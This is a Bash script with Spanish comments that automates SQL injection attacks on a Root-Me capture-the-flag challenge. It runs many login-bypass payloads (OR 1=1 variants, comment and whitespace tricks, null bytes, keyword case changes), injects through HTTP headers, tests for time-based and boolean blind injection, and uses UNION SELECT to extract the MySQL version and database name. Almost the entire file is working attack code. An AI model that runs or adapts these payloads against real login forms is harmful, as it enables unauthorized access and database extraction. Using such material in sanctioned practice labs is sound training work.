#!/bin/bash

# ================================================
# SQL INJECTION FILTER BYPASS - ROOT-ME CH30
# Script completo con todas las técnicas
# ================================================

URL="http://challenge01.root-me.org/web-serveur/ch30/"
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}  SQL INJECTION FILTER BYPASS - CH30${NC}"
echo -e "${BLUE}========================================${NC}"

# Función para probar payloads
test_payload() {
    local payload=$1
    local desc=$2
    local response=$(curl -s -X POST "$URL" -d "$payload" | grep -E "Membres|login failed")
    
    if echo "$response" | grep -q "Membres"; then
        echo -e "${GREEN}[✓] ÉXITO!${NC} $desc"
        echo -e "${GREEN}    Payload: $payload${NC}"
        echo -e "${GREEN}    Respuesta: $response${NC}"
        return 0
    else
        echo -e "${RED}[✗] Fallo${NC} $desc"
        return 1
    fi
}

# Función para probar cabeceras
test_header() {
    local header=$1
    local value=$2
    local desc=$3
    local response=$(curl -s -X POST "$URL" -d "username=admin&password=test" -H "$header: $value" | grep -E "Membres|login failed")
    
    if echo "$response" | grep -q "Membres"; then
        echo -e "${GREEN}[✓] ÉXITO!${NC} $desc"
        echo -e "${GREEN}    Header: $header: $value${NC}"
        return 0
    else
        echo -e "${RED}[✗] Fallo${NC} $desc"
        return 1
    fi
}

echo -e "\n${YELLOW}[+] FASE 1: Inyección en contraseña (técnicas básicas)${NC}"
echo "--------------------------------------------------------"

test_payload "username=admin&password=' OR 1=1#" "OR 1=1 básico"
test_payload "username=admin&password=' OR '1'='1#" "OR '1'='1"
test_payload "username=admin&password=' || 1=1#" "|| (OR alternativo)"
test_payload "username=admin&password=1 OR 1=1#" "OR sin comillas"
test_payload "username=admin&password=' AND 1=1#" "AND 1=1"
test_payload "username=admin&password='='#" "Comparación de strings"

echo -e "\n${YELLOW}[+] FASE 2: Inyección en contraseña (bypass de filtros)${NC}"
echo "--------------------------------------------------------"

test_payload "username=admin&password='%20OR%201=1#" "OR con URL encoding"
test_payload "username=admin&password='%09OR%091=1#" "OR con tabulación"
test_payload "username=admin&password='%0aOR%0a1=1#" "OR con newline"
test_payload "username=admin&password='/**/OR/**/1=1#" "OR con comentarios"
test_payload "username=admin&password='%00OR%001=1#" "OR con null byte"
test_payload "username=admin&password='OR(1=1)#" "OR sin espacios"

echo -e "\n${YELLOW}[+] FASE 3: Inyección en contraseña (operadores matemáticos)${NC}"
echo "--------------------------------------------------------"

test_payload "username=admin&password=' + 1=1#" "Suma"
test_payload "username=admin&password=' - 1=0#" "Resta"
test_payload "username=admin&password=' * 1=1#" "Multiplicación"
test_payload "username=admin&password=' / 1=1#" "División"
test_payload "username=admin&password=' LIKE '%'#" "LIKE"

echo -e "\n${YELLOW}[+] FASE 4: Inyección en contraseña (UNION SELECT)${NC}"
echo "--------------------------------------------------------"

test_payload "username=admin&password=' UNION SELECT 1,2,3,4#" "UNION básico"
test_payload "username=admin&password=' UNION SELECT 1,2,pass,4 FROM membres#" "UNION extraer pass"
test_payload "username=admin&password=' UNION SELECT null,null,null,null#" "UNION con null"
test_payload "username=admin&password=' UNION ALL SELECT 1,2,3,4#" "UNION ALL"

echo -e "\n${YELLOW}[+] FASE 5: Inyección en usuario${NC}"
echo "--------------------------------------------------------"

test_payload "username=' OR 1=1#&password=test" "Usuario: OR 1=1"
test_payload "username=admin' OR 1=1#&password=test" "Usuario: admin' OR 1=1"
test_payload "username=admin'--&password=test" "Usuario: admin'--"
test_payload "username=' OR '1'='1&password=test" "Usuario: OR '1'='1"
test_payload "username=' || 1=1#&password=test" "Usuario: ||"

echo -e "\n${YELLOW}[+] FASE 6: Cabeceras HTTP${NC}"
echo "--------------------------------------------------------"

test_header "User-Agent" "' OR 1=1#" "User-Agent OR"
test_header "User-Agent" "' UNION SELECT 1,2,3,4#" "User-Agent UNION"
test_header "Referer" "' OR 1=1#" "Referer OR"
test_header "Cookie" "session=' OR 1=1#" "Cookie OR"
test_header "X-Forwarded-For" "' OR 1=1#" "X-Forwarded-For OR"
test_header "X-Forwarded-For" "' UNION SELECT 1,2,3,4#" "X-Forwarded-For UNION"

echo -e "\n${YELLOW}[+] FASE 7: Parámetros GET${NC}"
echo "--------------------------------------------------------"

test_payload "username=admin&password=' OR 1=1#" "GET action login"
test_payload "username=admin&password=' OR 1=1#" "GET action membres"

echo -e "\n${YELLOW}[+] FASE 8: Inyección a ciegas basada en tiempo${NC}"
echo "--------------------------------------------------------"

echo -e "${BLUE}[*] Probando SLEEP(5)...${NC}"
time_response=$(curl -s -w "%{time_total}" -X POST "$URL" -d "username=admin&password=' AND SLEEP(5)#" -o /dev/null)
echo -e "Tiempo de respuesta: ${time_response}s"
if (( $(echo "$time_response > 4" | bc -l) )); then
    echo -e "${GREEN}[✓] Posible inyección basada en tiempo detectada!${NC}"
else
    echo -e "${RED}[✗] No hay inyección basada en tiempo${NC}"
fi

echo -e "\n${YELLOW}[+] FASE 9: Inyección a ciegas booleana${NC}"
echo "--------------------------------------------------------"

# Probar si la inyección booleana funciona
response_true=$(curl -s -X POST "$URL" -d "username=admin&password=' AND 1=1#" | grep -c "Membres")
response_false=$(curl -s -X POST "$URL" -d "username=admin&password=' AND 1=2#" | grep -c "Membres")

if [ "$response_true" -ne "$response_false" ]; then
    echo -e "${GREEN}[✓] Posible inyección booleana detectada!${NC}"
else
    echo -e "${RED}[✗] No hay inyección booleana${NC}"
fi

echo -e "\n${YELLOW}[+] FASE 10: Comentarios alternativos${NC}"
echo "--------------------------------------------------------"

test_payload "username=admin&password=' OR 1=1 -- " "-- (espacio)"
test_payload "username=admin&password=' OR 1=1 --+" "--+ (MySQL)"
test_payload "username=admin&password=' OR 1=1 /*" "/* */ (bloque)"
test_payload "username=admin&password=' OR 1=1;%00" ";%00 (null byte)"
test_payload "username=admin&password=' OR 1=1%00" "%00 (null byte directo)"

echo -e "\n${YELLOW}[+] FASE 11: Bypass de palabras clave${NC}"
echo "--------------------------------------------------------"

test_payload "username=admin&password=' OoR 1=1#" "OR con mayúsculas"
test_payload "username=admin&password=' oR 1=1#" "OR minúsculas"
test_payload "username=admin&password=' Or 1=1#" "Or mixto"
test_payload "username=admin&password=' O/**/R 1=1#" "OR con comentario"

echo -e "\n${YELLOW}[+] FASE 12: Extracción de datos (si hay inyección)${NC}"
echo "--------------------------------------------------------"

# Extraer versión de MySQL
version=$(curl -s -X POST "$URL" -d "username=admin&password=' UNION SELECT 1,2,@@version,4#" | grep -Eo "[0-9]+\.[0-9]+\.[0-9]+")
if [ -n "$version" ]; then
    echo -e "${GREEN}[✓] Versión de MySQL: $version${NC}"
fi

# Extraer nombre de la base de datos
db=$(curl -s -X POST "$URL" -d "username=admin&password=' UNION SELECT 1,2,database(),4#" | grep -Eo "[a-zA-Z0-9_]+" | head -1)
if [ -n "$db" ]; then
    echo -e "${GREEN}[✓] Base de datos: $db${NC}"
fi

echo -e "\n${BLUE}========================================${NC}"
echo -e "${BLUE}  FIN DEL ESCANEO${NC}"
echo -e "${BLUE}========================================${NC}"
